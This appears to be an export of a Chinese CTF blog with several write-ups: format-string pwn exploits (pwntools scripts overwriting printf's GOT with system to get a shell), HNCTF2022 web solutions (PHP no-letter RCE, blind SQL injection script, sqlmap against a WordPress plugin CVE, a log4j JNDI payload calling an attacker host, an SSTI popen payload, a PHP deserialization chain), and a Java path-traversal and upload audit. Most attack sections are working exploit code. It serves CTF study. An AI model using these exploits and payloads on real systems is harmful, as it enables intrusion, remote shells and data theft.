&gt;&gt; 4)) &lt;&lt; 2;//4 x &gt;&gt;= b4; b2 = (!!(x &gt;&gt; 2)) &lt;&lt; 1;//2 x &gt;&gt;= b2; b1 = (!!(x &gt;&gt; 1)); x &gt;&gt;= b1; b0 = x; int result = b0 + b1 + b2 + b4 + b8 + b16 + 1; return result;} 下面就是一种寻找高位的二分法，最后再加上符号位一个1。 https://binac.io/posts/csapp-data-lab/#fn:3 11.floatScale2unsigned floatScale2(unsigned uf) { //exp, sign, frac unsigned sign = (uf &gt;&gt; 31) &amp; 1; unsigned exp = (uf &gt;&gt; 23) &amp; 0xFF;//0xF=1111 表示4位 unsigned frac = uf &amp; 0x7FFFFF; //0 if(exp == 0 &amp;&amp; frac == 0) { return uf; } //infinity or NaN if(exp == 0xFF) { return uf; } //denormalize if(exp == 0) { //E = exp -127; frac &lt;&lt;= 1; return (sign &lt;&lt; 31) | frac; } //normalize exp++; //E = exp -127; return (sign &lt;&lt; 31) | (exp &lt;&lt; 23) | frac;} 这题看看书的IEEE浮点数表示，在进行分类讨论 12.floatFloat2Int这个就直接写注释里了 int floatFloat2Int(unsigned uf) { //exp, sign, frac unsigned sign = (uf &gt;&gt; 31) &amp; 1; unsigned exp = (uf &gt;&gt; 23) &amp; 0xFF;//0xF=1111 表示4位 unsigned frac = uf &amp; 0x7FFFFF; //0 if(exp == 0 &amp;&amp; frac == 0) { return 0; } //infinity or NaN if(exp == 0xFF) { return 0x80000000; } //denormalize if(exp == 0) { //M 0.11111(2) 很小 //E = 1 - 127 = -126(原书上的，当为非规格化，E = 1 - Bias); return 0; } //normalize int E = exp - 127; frac = frac | (1 &lt;&lt; 23); //1&lt;= M &lt; 2; if(E &gt; 31) //1.xxxxx { return 0x80000000; } else if(E &lt; 0) { return 0; } if(E &gt;= 23) { frac &lt;&lt;= (E - 23); }else { frac &gt;&gt;= (23 - E); } if(sign) { return ~frac + 1; } else { return frac; } } 13.floatPower2unsigned floatPower2(int x) { if(x &lt; -149) { return 0; }else if(x &lt; -126) { int shift = 23 + (x + 126); return 1 &lt;&lt; shift; }else if(x &lt;= 127) { int exp = x + 127; return exp &lt;&lt; 23; }else if(x &gt; 127) { return 0xFF &lt;&lt; 23; } }要把time_out改为20。。。 总结：太菜了，有的题目看不懂，也不会做。怎么说，只能慢慢学，有空多复习，温故而知新。","link":"/2021/11/28/datalab/"},{"title":"格式化字符串在bss段的利用","text":"相比格式化字符串在栈上，这种情况的利用要复杂很多，更多的是要分步去改写对应的值 这里以HITCON—Training lab9为例，这是一道很经典的题目 参考星盟v1ctor师傅讲解 v1ctor师傅在视频里的exp，在我这打不通，我试了下，应该是字节写入的问题，有地方可能没改完全。 23R3F师傅 源码 #include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;char buf[200] ;void do_fmt(){ while(1){ read(0,buf,200); if(!strncmp(buf,&quot;quit&quot;,4)) break; printf(buf); } return ;}void play(){ puts(&quot;=====================&quot;); puts(&quot; Magic echo Server&quot;); puts(&quot;=====================&quot;); do_fmt(); return;}int main(){ setvbuf(stdout,0,2,0); play(); return;} printf(buf)有明显的格式化字符串漏洞，并且，从源码里就可以看到buf是存在bss段而不是栈上 gdb调试，断点下在printf上 根据上面两位师傅的讲解我们知道能够利用把漏洞利用串起来，从bss段改到栈上的跳板，就下面四条，偏移为6，7，10，11. 06:0018│ ebp 0xffffd458 —▸ 0xffffd468 —▸ 0xffffd478 ◂— 0x0 //这个07:001c│ 0xffffd45c —▸ 0x8048584 (play+59) ◂— nop //这个08:0020│ 0xffffd460 —▸ 0xf7fbdd80 (_IO_2_1_stdout_) ◂— 0xfbad288709:0024│ 0xffffd464 ◂— 0x00a:0028│ 0xffffd468 —▸ 0xffffd478 ◂— 0x0//这个0b:002c│ 0xffffd46c —▸ 0x80485b1 (main+42) ◂— nop //这个 Step 1首先先利用漏洞泄漏地址，把上面四条要用的都找出来 payload paylaod = 'aaaa%6$p'sl(paylaod)ru(&quot;aaaa&quot;)ebp_content = int(rv(10), 16)ebp_base = ebp_content - 0x10step1 = ebp_content - 0xcstep2 = ebp_content + 0x4ms(&quot;ebp_content&quot;, ebp_content)ms(&quot;ebp_base&quot;, ebp_base)ms(&quot;ebp_content-0xc&quot;, step1)ms(&quot;main_offset&quot;, step2) Step 2接下来先把偏移6，7串起来，变成下面这样 接着就可以将play的低两位改成print_got payload payload1 = &quot;%&quot; + str(step1 &amp; 0xffff) + &quot;c%6$hn&quot;sl(payload1)#raw_input('&gt;')rc()payload2 = &quot;%&quot; + str(printf_got &amp; 0xffff) + &quot;c%10$hn&quot;sl(payload2)rc()while 1: sd(&quot;lnk&quot;) sleep(0.1) data = rc() if data.find(&quot;lnk&quot;) != -1: break#raw_input('&gt;') Step 3我们的目的是 计算出system函数的地址 ,将system函数地址写入printf在got表的地址 所以我们先要泄漏出system的地址，无法直接泄漏，但是我们可以先利用格式化字符串漏洞泄漏printf的地址，然后通过偏移计算system payload leak_printf = 'aaaa%7$s'sl(leak_printf)ru(&quot;aaaa&quot;)printf_addr = u32(rv(4))ms(&quot;printf_addr&quot;, printf_addr)system_addr = printf_addr - printf_off + system_libcms(&quot;system&quot;, system_addr) Step 4将system地址写入printf所在got表的位置的具体做法就是，在偏移为7的位置改低位，在偏移为11的位置改高位 因为无法直接改，所以我们又要通过跳板，就是最开始main那个跳板 改为这样 #raw_input('&gt;')payload3 = &quot;%&quot; + str(step2 &amp; 0xffff) + &quot;c%6$hn&quot;sl(payload3)rc()payload4 = &quot;%&quot; + str((printf_got+2) &amp; 0xffff) + &quot;c%10$hn&quot;sl(payload4)rc()while 1: sd(&quot;lnk&quot;) sleep(0.1) data = rc() if data.find(&quot;lnk&quot;) != -1: break Step 5最后就是改printf地址为system，当再次调用printf函数的时候，就会通过got表找到system的地址，然后执行 payload payload5 = &quot;%&quot; + str(system_addr &amp; 0xffff) + &quot;c%7$hn&quot;payload5 += &quot;%&quot; + str((system_addr &gt;&gt; 16) - (system_addr &amp; 0xffff)) + &quot;c%11$hn&quot;sl(payload5)rc()while 1: sd(&quot;lnk&quot;) sleep(0.1) data = rc() if data.find(&quot;lnk&quot;) != -1: break#raw_input('&gt;')sl(&quot;/bin/sh&quot;) exp有个很奇怪的点，我必须要加上context.log_level = 'debug'才能够打通，不然最后那个while会报错…. 很难绷得住💦 from pwn import *context.log_level = 'debug'elf = ELF('./playfmt')libc = ELF('/lib/i386-linux-gnu/libc.so.6')io = process('./playfmt')sl = lambda s : io.sendline(s)sd = lambda s : io.send(s)rv = lambda n : io.recv(n)rc = lambda : io.recv()ru = lambda s : io.recvuntil(s)def ms(name,addr): print(name + &quot;----&gt;&quot; + hex(addr))def debug(mallocr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print }}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(io,'b *{}'.format(hex(text_base+mallocr))) else: gdb.attach(io,&quot;b *{}&quot;.format(hex(mallocr)))printf_got = elf.got['printf']printf_off = libc.symbols['printf']system_libc = libc.symbols['system']paylaod = 'aaaa%6$p'sl(paylaod)ru(&quot;aaaa&quot;)ebp_content = int(rv(10), 16)ebp_base = ebp_content - 0x10step1 = ebp_content - 0xcstep2 = ebp_content + 0x4ms(&quot;ebp_content&quot;, ebp_content)ms(&quot;ebp_base&quot;, ebp_base)ms(&quot;ebp_content-0xc&quot;, step1)ms(&quot;main_offset&quot;, step2)payload1 = &quot;%&quot; + str(step1 &amp; 0xffff) + &quot;c%6$hn&quot;sl(payload1)#raw_input('&gt;')rc()payload2 = &quot;%&quot; + str(printf_got &amp; 0xffff) + &quot;c%10$hn&quot;sl(payload2)rc()while 1: sd(&quot;lnk&quot;) sleep(0.1) data = rc() if data.find(&quot;lnk&quot;) != -1: break#raw_input('&gt;')payload3 = &quot;%&quot; + str(step2 &amp; 0xffff) + &quot;c%6$hn&quot;sl(payload3)rc()payload4 = &quot;%&quot; + str((printf_got+2) &amp; 0xffff) + &quot;c%10$hn&quot;sl(payload4)rc()while 1: sd(&quot;lnk&quot;) sleep(0.1) data = rc() if data.find(&quot;lnk&quot;) != -1: breakleak_printf = 'aaaa%7$s'sl(leak_printf)ru(&quot;aaaa&quot;)printf_addr = u32(rv(4))ms(&quot;printf_addr&quot;, printf_addr)system_addr = printf_addr - printf_off + system_libcms(&quot;system&quot;, system_addr)payload5 = &quot;%&quot; + str(system_addr &amp; 0xffff) + &quot;c%7$hn&quot;payload5 += &quot;%&quot; + str((system_addr &gt;&gt; 16) - (system_addr &amp; 0xffff)) + &quot;c%11$hn&quot;sl(payload5)rc()while 1: sd(&quot;lnk&quot;) sleep(0.1) data = rc() if data.find(&quot;lnk&quot;) != -1: breakraw_input('&gt;')sl(&quot;/bin/sh&quot;)io.interactive()","link":"/2022/02/12/fmt_bss/"},{"title":"Format String","text":"格式化字符串 格式化字符串漏洞在理由时一般分为三个部分 格式化字符串函数 格式化字符串 要输出的变量（可选） 具体原理可参考CTF-WIKI，这里主要记录下做题的过程（👴又🥬又懒🐶，写不动🌶️ 2022-1-7更新。。。感觉还是有些点问题，比如内存写入不太清晰，还是写下笔记，这里主要是32位下的程序 泄漏内存数据 泄漏栈上内容 32位： %n$x (return栈上第n+1个参数值)64位： %n$p (return栈上第n-5个参数值)（64位下优先寄存器传参 泄漏内存地址的内容 32位： %n$s：把栈上第n+1个参数的值作为地址，返回该地址内存的值64位： %n$s：把栈上第n-5个参数的值作为地址，返回该地址内存的值 覆写内存数据 形式和泄漏类似，将$s改为$n 用%xc控制写入字符数 %***c%n$n： 把栈上第n+1个参数的值作为地址，将该地址的高32bit值改为 hex(***)%***c%n$hn： 把栈上第n+1个参数的值作为地址，将该地址的高16bit值改为 hex(***)%***c%n$hhn：把栈上第n+1个参数的值作为地址，将该地址的高8bit值改为 hex(***)hh一个字节，h双字节 例如 #include&lt;stdio.h&gt;int main(void){ int x = 3; int* p; p = &amp;x; printf(&quot;0x12345678%n\\n&quot;, p); printf(&quot;x = %d\\n&quot;, x); return 0;} 这样x的值就会被修改为10 例题：[Jarvis OJ]fm这题逻辑挺简单，x初始化为3，当修改x=4时就可以读出flag，所以我们就要利用format string将x对应内存地址处的值改为4 然后偏移的话，利用pwngdb的插件fmtarg算出是11 printf(x_address+&quot;%c$n&quot;)可以修改[x_address]的值为x_address的字符长度这里很巧的一点就是p32(x_addr)的长度刚好是4个字节 exp from pwn import *io = remote('pwn2.jarvisoj.com' ,9895)x_addr = 0x0804A02Cpayload = p32(x_addr) + b&quot;%11$n&quot;io.sendline(payload)io.interactive() 实时数据监测可以直接覆盖，也可以双字节覆盖 exp from pwn import *io = remote('111.200.241.244', 54060)#io = process('./mon')context.log_level = 'debug'key_bss = 0x0804A048offset = 12#payload = fmtstr_payload(offset, {key_bss:0x02223322})payload = p32(key_bss+2) + p32(key_bss)payload += &quot;%&quot; + str(0x0222 - 8) + &quot;c%12$hn&quot;payload += &quot;%&quot; + str(0x3322 - 0x0222) + &quot;c%13$hn&quot;io.sendline(payload)io.interactive() inndy_echo导入IDA中可以看到 do { fgets(&amp;s, 256, stdin); printf(&amp;s); } while ( strcmp(&amp;s, &quot;exit\\n&quot;) ); system(&quot;echo Goodbye&quot;); 在printf处可以利用，先在gdb中算出偏移是7，然后我们看到有system函数，我们就可以利用GOT HiJack将printf@got的内容改写成system@plt的地址,再写入/bin/sh\\x00执行 from pwn import *elf = ELF('echo')#io = process('./echo')io = remote('node4.buuoj.cn',26569)#context.terminal = ['tmux','splitw','-h']printf_got = elf.got['printf']system_plt = elf.plt['system']payload = fmtstr_payload(7,{printf_got:system_plt})io.sendline(payload)io.send('/bin/sh\\x00')io.interactive() wdb_2018_2nd_easyfmt首先查看文件是32位的只开了NX保护，用ida打开看下程序逻辑 puts(&quot;Do you know repeater?&quot;); while ( 1 ) { read(0, &amp;buf, 0x64u); printf(&amp;buf); putchar(10); } 看上去就是写了个死循环，重复输入输出，且printf处存在格式化字符漏洞 首先找到格式化字符的偏移，用fmtarg发现是The index of format argument : 7 (&quot;\\%6$p&quot;) 通过printf@got的地址leak出我们想要的printf_addr，然后利用libc算出system(因为这里程序没有调用system函数，我们只能在libc中找) 然后覆写printf@got地址为system的地址，再发送执行/bin/sh\\x00拿到shell printf_got = elf.got['printf']payload = p32(printf_got) + &quot;%6$s&quot;io.recvuntil(&quot;repeater?\\n&quot;)io.sendline(payload)io.recv(4) #先接收print@got的地址，然后才是我们想要泄漏的printf_addr = u32(io.recv(4))print(hex(printf_addr)) 下面红框里的才是我们需要的，蓝色框是printf@got的地址 exp # coding=UTF-8from pwn import *#io = process('./eyfmt')io = remote('node4.buuoj.cn',28484)elf = ELF('./eyfmt')libc = ELF('./libc-2.23_32.so')context.log_level = 'debug'printf_got = elf.got['printf']payload = p32(printf_got) + &quot;%6$s&quot;io.recvuntil(&quot;repeater?\\n&quot;)io.sendline(payload)io.recv(4) #先接收print@got的地址，然后才是我们想要泄漏的printf_addr = u32(io.recv(4))print(hex(printf_addr))'''因为这里LibcSearch不能用，libc文件在buu上下载libc = LibcSearch('printf', printf_addr)libc_base = printf_addr - libc.dump['printf']system = libc_base + libc.dump['system']'''libc_base = printf_addr - libc.symbols['printf']print(hex(libc_base))system = libc_base + libc.symbols['system']print(hex(system))payload1 = fmtstr_payload(6,{printf_got:system})io.sendline(payload1)io.send('/bin/sh\\x00')io.interactive() greeting-150攻防世界的一道题目，格式化字符串任意写以及 _do_global_dtors_aux_fini_array_entry循环利用 exp from pwn import *elf = ELF('./greeting')io = remote('111.200.241.244', 50819)fini_arr = 0x08049934main = 0x080485EDstrlen_got = 0x08049A54system_plt = 0x08048490payload = b'k' * 2 # 2payload += p32(strlen_got+2)payload += p32(fini_arr+2)payload += p32(strlen_got)payload += p32(fini_arr)#16pad_len = len(&quot;Nice to meet you, &quot;) #18payload += b&quot;%&quot; + str(0x0804 - 0x24) + &quot;c%12$hn%13$hn&quot;payload += b&quot;%&quot; + str(0x8490 - 0x0804) + &quot;c%14$hn&quot;payload += b&quot;%&quot; + str(0x85ED - 0x8490) + &quot;c%15$hn&quot;io.sendlineafter(&quot;Please tell me your name... &quot;, payload)io.recvuntil(&quot;Please tell me your name... &quot;)io.sendline('/bin/sh\\x00')io.interactive() [CISCN 2019西南]PWN1这题和上题基本上一样的，循环➕任意覆盖地址 exp from pwn import *io = remote('1.14.71.254', 28030)elf = ELF('./ciscn_2019_sw_pwn1')main = 0x08048534fini_addr = 0x0804979Cprintf_got = elf.got['printf']system_plt = 0x080483d0payload = p32(printf_got + 2) + p32(fini_addr + 2) + p32(printf_got) + p32(fini_addr)payload += &quot;%&quot; + str(0x0804 - 16) + &quot;c%4$hn%5$hn&quot;payload += &quot;%&quot; + str(0x83d0 - 0x0804) + &quot;c%6$hn&quot;payload += &quot;%&quot; + str(0x8534 - 0x83d0) + &quot;c%7$hn&quot;io.sendlineafter('name?', payload)io.recvuntil(&quot;name?&quot;)io.sendline('/bin/sh\\x00')io.interactive() TODO.. 参考https://cartermgj.github.io/2018/01/16/fsb_summary/ https://bbs.ichunqiu.com/thread-42943-1-1.html?from=bkyl https://blog.csdn.net/qq_42728977/article/details/102880186?spm=1001.2014.3001.5501 https://blog.csdn.net/seaaseesa/article/details/102985263?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164207018816780261995209%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164207018816780261995209&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-102985263.first_rank_v2_pc_rank_v29&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cgreeting-150&amp;spm=1018.2226.3001.4187","link":"/2021/12/12/fmt/"},{"title":"HNCTF2022 Web部分WriteUp","text":"HNCTF2022 Web部分题解这里我没有全部记录，只记录一些个人觉得有意思的点。 [Week1]Challenge__rce源码 &lt;?phperror_reporting(0);if (isset($_GET['hint'])) { highlight_file(__FILE__);}if (isset($_POST['rce'])) { $rce = $_POST['rce']; if (strlen($rce) &lt;= 120) { if (is_string($rce)) { if (!preg_match(&quot;/[!@#%^&amp;*:'\\-&lt;?&gt;\\&quot;\\/|`a-zA-Z~\\\\\\\\]/&quot;, $rce)) { eval($rce); } else { echo(&quot;Are you hack me?&quot;); } } else { echo &quot;I want string!&quot;; } } else { echo &quot;too long!&quot;; }} 这题过滤真的挺严格的，基本上之前的手段都被ban了 &lt;?phpfor($a = 0; $a &lt; 256; $a++){ if (!preg_match(&quot;/[!@#%^&amp;*:'\\-&lt;?&gt;\\&quot;\\/|`a-zA-Z~\\\\\\\\]/&quot;, chr($a))){ echo urlencode(chr($a)).&quot; &quot;; }} 主要的思路就来自p牛的无字母数字webshell之提高篇还有hint ctfshow吃瓜杯shellme_revenge那题。 但是仿照这些去构造_GET总是长度过长，还有就是吃瓜杯那题，，这题\\符号是不能用的 最后的解法的话，要利用chr来构造，利用Array的a自增到ch，然后拼接上里面有的r，再利用ascii码构造出_GET &lt;?php$_=([].«){3};var_dump($_); //a$_++; //b$_.=++$_; //cc$_++; //cd$_++; //ce$_++; //cf$_++; //cg$_++; //ch$_.=([].«){2}; //chrvar_dump($_);$_=_.$_(71).$_(69).$_(84); // _GETvar_dump($_);($$_[0])($$_[1]); [WEEK2]ez_ssrf这题…感觉代码写的有点问题，请求要响应半天才显示 有时候还直接400 payload http://43.143.7.97:28957/index.php?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiAxMjcuMC4wLjEKQ29ubmVjdGlvbjogY2xvc2UK [WEEK2]easy_sql盲注+无列名注入 首先这里简单fuzz一下，发现主要过滤了information_schema ,#,and,空格等。 过滤information_schema的话，就考虑下面这四个，但是这题只有利用mysql.innodb_table_stats和mysql.innodb_index_stats mysql注入绕过information_schema过滤 注入出库名和表名，之后只能采用无列名注入，payload和[SWPU2019]Web1那题是类似的 exp import requestsurl = 'http://43.143.7.97:28812/index.php'databases = 'ctf, ctftraining, mysql'# select = &quot;select/**/group_concat(database_name)/**/from/**/mysql.innodb_index_stats&quot;# select = &quot;select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name='ctftraining'&quot;tables = 'flag, news, users'select = &quot;select/**/group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select*from/**/ctftraining.flag)n&quot;flag = ''for i in range(10000): for s in range(32, 128): # payload = f&quot;2'or(if(ascii(substr(({select}),{i},1))={s},1,0))or'1'='2&quot; payload = f&quot;2'or(if(ascii(substr(({select}),{i},1))={s},1,0))or'1'='2&quot; res = requests.post(url=url, data={'id': payload}) # print(&quot;[*]Testing-&gt;&quot;, chr(s)) if 'Here is your want!' in res.text: flag += chr(s) print(flag) break [WEEK2]ohmywordpress这一题是个wordpress，它本身是没啥漏洞的，主要是一些插件的洞，上次强网杯也是，这里的话，可以直接看源码发现有两个插件，或者直接wp-scan可以扫出来有个插件版本是没更新的 于是就直接谷歌搜，搜出来CVE-2022-0760，有利用payload 可以看到是可以时间盲注的 直接上sqlmap了 POST /wp-admin/admin-ajax.php HTTP/1.1Host: 43.143.7.97:28116User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://43.143.7.97:28116/wp-admin/admin-ajax.phpContent-Type: application/x-www-form-urlencodedContent-Length: 83Origin: http://43.143.7.97:28116Connection: closeUpgrade-Insecure-Requests: 1action=qcopd_upvote_action&amp;post_id=* sqlmap -r 1.txt --level 3sqlmap -r 1.txt --level 3 --dbs[*] ctftraining[*] information_schema[*] mysql[*] performance_schema[*] test[*] wordpresssqlmap -r 1.txt --level 3 --tables -D ctftraining+-------+| flag || news || users |+-------+sqlmap -r 1.txt --level 3 --dump -D ctftraining -T flag [WEEK3]logjjjjlogjjjj就是log4j的漏洞复现，利用这个 payload java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vps -p 2333 ${jndi:ldap://vps:1389/TomcatBypass/TomcatEcho} //要url编码传过去 可以直接执行命令，也可以反弹shell [WEEK3]ssssti比之前那题多了过滤，引号 下划线， 看这位师傅学到了用lipsum {{lipsum[request.values.a][request.values.b][request.values.c](request.values.d).popen(request.values.e).read()}}&amp;a=__globals__&amp;b=__builtins__&amp;c=__import__&amp;d=os&amp;e=ls / [WEEK4]pop子和pipi美&lt;?phperror_reporting(0);//flag is in f14g.phpclass Popuko { private $No_893; public function POP_TEAM_EPIC(){ $WEBSITE = &quot;MANGA LIFE WIN&quot;; } public function __invoke(){ $this-&gt;append($this-&gt;No_893); } public function append($anti_takeshobo){ include($anti_takeshobo); }}class Pipimi{ public $pipi; public function PIPIPMI(){ $h = &quot;超喜欢POP子ww,你也一样对吧(举刀)&quot;; } public function __construct(){ echo &quot;Pipi美永远不会生气ww&quot;; $this-&gt;pipi = array(); } public function __get($corepop){ $function = $this-&gt;p; return $function(); }}class Goodsisters{ public function PopukoPipimi(){ $is = &quot;Good sisters&quot;; } public $kiminonawa,$str; public function __construct($file='index.php'){ $this-&gt;kiminonawa = $file; echo 'Welcome to HNCTF2022 ,'; echo 'This is '.$this-&gt;kiminonawa.&quot;&lt;br&gt;&quot;; } public function __toString(){ return $this-&gt;str-&gt;kiminonawa; } public function __wakeup(){ if(preg_match(&quot;/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\\.\\./i&quot;, $this-&gt;kiminonawa)) { echo &quot;仲良ピース!&quot;; $this-&gt;kiminonawa = &quot;index.php&quot;; } }}if(isset($_GET['pop'])) @unserialize($_GET['pop']);else{ $a=new Goodsisters; if(isset($_GET['pop_EP']) &amp;&amp; $_GET['pop_EP'] == &quot;ep683045&quot;){ highlight_file(__FILE__); echo '欸嘿,你也喜欢pop子~对吧ww'; }} 这题开头的参数有点阴间，要传番号，开始没懂，问了别人才知道… 这里也很明显，主要就是执行那个include函数包含出flag，然后过滤用伪协议就好。 主要思路呢，就是通过invoke去调用append执行include函数，而__invoke()当一个对象被当作函数调用时触发, 然后我们可以看到Pipimi有个get方法可以触发他，而__get()类中的属性私有或不存在触发，接着我们可以看到下面的toString方法， 通过它把上面的链起来。 exp &lt;?phpclass Popuko{ private $No_893 = &quot;php://filter/read=convert.base64-encode/resource=f14g.php&quot;;}class Pipimi{ public $pipi;}class Goodsisters{ public $kiminonawa,$str;}$a = new Popuko();$b = new Pipimi();$b-&gt;p = $a;$c = new Goodsisters();$c-&gt;str = $b;$d = new Goodsisters();$d-&gt;kiminonawa = $c; echo urlencode(serialize($d)); [WEEK4]fun_sql&lt;?include &quot;mysql.php&quot;;include &quot;flag.php&quot;;if ( $_GET['uname'] != '' &amp;&amp; isset($_GET['uname'])) { $uname=$_GET['uname']; if(preg_match(&quot;/regexp|left|extractvalue|floor|reverse|update|between|flag|=|&gt;|&lt;|and|\\||right|substr|replace|char|&amp;|\\\\\\$|0x|sleep|\\#/i&quot;,$uname)){ die('hacker'); } $sql=&quot;SELECT * FROM ccctttfff WHERE uname='$uname';&quot;; echo &quot;$sql&lt;br&gt;&quot;; mysqli_multi_query($db, $sql); $result = mysqli_store_result($db); $row = mysqli_fetch_row($result); echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; if (!$row) { die(&quot;something wrong&quot;); } else { print_r($row); echo $row['uname'].&quot;&lt;br&gt;&quot;; } if ($row[1] === $uname) { die($flag); }}highlight_file(__FILE__); **有点像堆叠注入，但是貌似不能多语句执行，只能用union来注入。** 确实是堆叠注入，看了官方wp可以用insert来注入 首先用order by来判断出3列，然后利用load_file来读flag，但是flag关键字被过滤了，一下子没想出来，问了其他师傅明白到了用concat连接字符串。 -1' union select 1,load_file(concat('/var/www/html/fla','g.php')),3--+ 总结有些题目还是挺有意思的，至少我是新生的时候没这个水平QAQ","link":"/2022/10/29/hnctf2022/"},{"title":"Java_Sec_Code---其他漏洞审计","text":"前言有些漏洞篇幅不是很大，就整合到一起来 路径穿越审计直接看到代码,看到名字读取图片然后转base64输出,首先判断文件是否存在而且不是目录，就以文件流读出来 private String getImgBase64(String imgFile) throws IOException { logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;)); logger.info(&quot;File path: &quot; + imgFile); File f = new File(imgFile); if (f.exists() &amp;&amp; !f.isDirectory()) { byte[] data = Files.readAllBytes(Paths.get(imgFile)); return new String(Base64.encodeBase64(data)); } else { return &quot;File doesn't exist or is not a file.&quot;; } } 定位到漏洞代码和修复代码 @GetMapping(&quot;/path_traversal/vul&quot;) public String getImage(String filepath) throws IOException { return getImgBase64(filepath); }@GetMapping(&quot;/path_traversal/sec&quot;) public String getImageSec(String filepath) throws IOException { if (SecurityUtil.pathFilter(filepath) == null) { logger.info(&quot;Illegal file path: &quot; + filepath); return &quot;Bad boy. Illegal file path.&quot;; } return getImgBase64(filepath); } 可以看到漏洞代码没有任何过滤，修复代码多了个SecurityUtil.pathFilter(filepath),我们跟进去看看 public static String pathFilter(String filepath) { String temp = filepath; // use while to sovle multi urlencode while (temp.indexOf('%') != -1) { try { temp = URLDecoder.decode(temp, &quot;utf-8&quot;); } catch (UnsupportedEncodingException e) { logger.info(&quot;Unsupported encoding exception: &quot; + filepath); return null; } catch (Exception e) { logger.info(e.toString()); return null; } } if (temp.contains(&quot;..&quot;) || temp.charAt(0) == '/') { return null; } return filepath; } 修复也很简单，首先判断%，有则进行url解码处理，然后判断有无..和/,常规的过滤 文件上传审计文件上传在spring业务中会很少，一般会采用cdn还有得上传到特定的目录下才能解析执行 spring的jsp文件必须在web-inf目录下才能执行 上传war包到tomcat的webapps目录。 没有过滤的上传 @PostMapping(&quot;/upload&quot;) public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file, RedirectAttributes redirectAttributes) { if (file.isEmpty()) { // 赋值给uploadStatus.html里的动态参数message redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;); return &quot;redirect:/file/status&quot;; } try { // Get the file and save it somewhere byte[] bytes = file.getBytes(); Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename()); Files.write(path, bytes); redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;You successfully uploaded '&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;'&quot;); } catch (IOException e) { redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;); logger.error(e.toString()); } return &quot;redirect:/file/status&quot;; } 这里固定在tmp目录下，但是可以通过../文件名这样上传到任意有权限的目录 限制图片的上传 @PostMapping(&quot;/upload/picture&quot;) @ResponseBody public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception { if (multifile.isEmpty()) { return &quot;Please select a file to upload&quot;; } String fileName = multifile.getOriginalFilename(); String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // 获取文件后缀名 String mimeType = multifile.getContentType(); // 获取MIME类型 String filePath = UPLOADED_FOLDER + fileName; File excelFile = convert(multifile); // 判断文件后缀名是否在白名单内 校验1 String[] picSuffixList = {&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;}; boolean suffixFlag = false; for (String white_suffix : picSuffixList) { if (Suffix.toLowerCase().equals(white_suffix)) { suffixFlag = true; break; } } if (!suffixFlag) { logger.error(&quot;[-] Suffix error: &quot; + Suffix); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;; } // 判断MIME类型是否在黑名单内 校验2 String[] mimeTypeBlackList = { &quot;text/html&quot;, &quot;text/javascript&quot;, &quot;application/javascript&quot;, &quot;application/ecmascript&quot;, &quot;text/xml&quot;, &quot;application/xml&quot; }; for (String blackMimeType : mimeTypeBlackList) { // 用contains是为了防止text/html;charset=UTF-8绕过 if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) { logger.error(&quot;[-] Mime type error: &quot; + mimeType); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;; } } // 判断文件内容是否是图片 校验3 boolean isImageFlag = isImage(excelFile); deleteFile(randomFilePath); if (!isImageFlag) { logger.error(&quot;[-] File is not Image&quot;); deleteFile(filePath); return &quot;Upload failed. Illeagl picture.&quot;; } try { // Get the file and save it somewhere byte[] bytes = multifile.getBytes(); Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename()); Files.write(path, bytes); } catch (IOException e) { logger.error(e.toString()); deleteFile(filePath); return &quot;Upload failed&quot;; } logger.info(&quot;[+] Safe file. Suffix: {}, MIME: {}&quot;, Suffix, mimeType); logger.info(&quot;[+] Successfully uploaded {}&quot;, filePath); return String.format(&quot;You successfully uploaded '%s'&quot;, filePath); }private void deleteFile(String filePath) { File delFile = new File(filePath); if(delFile.isFile() &amp;&amp; delFile.exists()) { if (delFile.delete()) { logger.info(&quot;[+] &quot; + filePath + &quot; delete successfully!&quot;); return; } } logger.info(filePath + &quot; delete failed!&quot;); } /** * 为了使用ImageIO.read() * * 不建议使用transferTo，因为原始的MultipartFile会被覆盖 * https://stackoverflow.com/questions/24339990/how-to-convert-a-multipart-file-to-file */ private File convert(MultipartFile multiFile) throws Exception { String fileName = multiFile.getOriginalFilename(); String suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); UUID uuid = Generators.timeBasedGenerator().generate(); randomFilePath = UPLOADED_FOLDER + uuid + suffix; // 随机生成一个同后缀名的文件 File convFile = new File(randomFilePath); boolean ret 